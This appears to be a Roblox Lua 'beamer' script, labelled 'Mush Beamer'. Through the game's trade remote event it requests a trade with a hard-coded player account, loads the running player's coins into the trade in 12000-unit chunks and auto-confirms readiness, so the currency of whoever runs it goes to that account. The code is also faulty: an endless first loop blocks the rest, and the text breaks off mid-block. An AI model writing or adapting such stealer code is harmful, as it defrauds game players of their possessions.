local mush = game:GetService("Players").LocalPlayer.Data.Coins.Value
local broke = false
local full = false
local two = false
local one = false

while wait(1) do
	if game.Players.LocalPlayer.PlayerGui.Trade.Enabled == false then

		local args = {
			[1] = "RequestTradeWithAsync",
			[2] = game:GetService("Players"):WaitForChild("lightwhite074")
		}

		game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))
	end
end

while wait(1) do
	if #game:GetService("Players").LocalPlayer.PlayerGui.Trade.BG.You["1"]:GetChildren() >= 3 then
		one = true
	end

	if one == true then
		local args = {
			[1] = "ToggleReadyStateAsync"
		}

		game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))
		one = false
		wait (10)
	end
end

while wait(1) do
	if #game:GetService("Players").LocalPlayer.PlayerGui.Trade.BG.You["2"]:GetChildren() >= 3 then
		two = true
	end

	if two == true then
		local args = {
			[1] = "ToggleReadyStateAsync"
		}

		game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))
		two = false
		wait (10)
	end
end

while wait(1) do
	if #game:GetService("Players").LocalPlayer.PlayerGui.Trade.BG.You["3"]:GetChildren() >= 3 then
		full = true
	end

	if full == true then
		local args = {
			[1] = "ToggleReadyStateAsync"
		}

		game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))
		full = false
		wait (10)
	end
end


--Mush Beamer
if mush >= 36000 then
	local args = {
		[1] = "AddItemAsync",
		[2] = {
			["Amount"] = 12000,
			["Type"] = "Shoom"
		}
	}

	game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))

	local args = {
		[1] = "AddItemAsync",
		[2] = {
			["Amount"] = 12000,
			["Type"] = "Shoom"
		}
	}

	game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))

	local args = {
		[1] = "AddItemAsync",
		[2] = {
			["Amount"] = 12000,
			["Type"] = "Shoom"
		}
	}

	game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))
end

if mush > 24000 and mush < 36000 then
	local args = {
		[1] = "AddItemAsync",
		[2] = {
			["Amount"] = 12000,
			["Type"] = "Shoom"
		}
	}

	game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))

	local args = {
		[1] = "AddItemAsync",
		[2] = {
			["Amount"] = 12000,
			["Type"] = "Shoom"
		}
	}

	game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))

	local args = {
		[1] = "AddItemAsync",
		[2] = {
			["Amount"] = mush,
			["Type"] = "Shoom"
		}
	}

	game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))
end

if mush > 12000 and mush < 24000 then
	local args = {
		[1] = "AddItemAsync",
		[2] = {
			["Amount"] = 12000,
			["Type"] = "Shoom"
		}
	}

	local args = {
		[1] = "AddItemAsync",
		[2] = {
			["Amount"] = mush,
			["Type"] = "Shoom"
		}
	}

	game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))
end

if mush <= 12000 then

	local args = {
		[1] = "AddItemAsync",
		[2] = {
			["Amount"] = mush,
			["Type"] = "Shoom"
		}
	}

	game:GetService("ReplicatedStorage"):WaitForChild("TradeMasterEvent"):FireServer(unpack(args))
